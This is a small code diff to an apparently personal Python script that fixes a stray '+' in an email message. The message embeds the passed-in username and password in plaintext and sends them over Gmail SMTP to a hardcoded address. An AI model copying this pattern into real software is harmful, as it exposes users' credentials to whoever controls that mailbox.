@@ -93,7 +93,7 @@ def main(ctx, username, passwd, verbose):
     "From: qinghao.shi@linaro.org",
     "To: qinghao.shi@linaro.org",
     "Subject: New message",
-    "Username: " + str(username) + "Password: " + str(passwd)+
+    "Username: " + str(username) + "Password: " + str(passwd)
     ])
 
     server = smtplib.SMTP('smtp.gmail.com:587')
